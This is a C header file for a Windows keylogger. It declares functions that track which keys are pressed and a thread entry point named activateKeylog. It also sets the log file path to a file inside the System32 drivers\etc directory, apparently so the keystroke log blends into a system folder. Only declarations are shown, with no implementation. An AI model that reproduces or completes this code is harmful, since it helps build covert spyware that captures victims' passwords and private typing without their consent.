#pragma once

#include <stdbool.h>

#define KEYLOG_PATH "C:\\Windows\\System32\\drivers\\etc\\log"

bool isKeyDown(int index, unsigned long long * keyDownStates);

void setKeyDown(int index, unsigned long long * keyDownStates);

void clearKeyDown(int index, unsigned long long * keyDownStates);

DWORD WINAPI activateKeylog(LPVOID param);
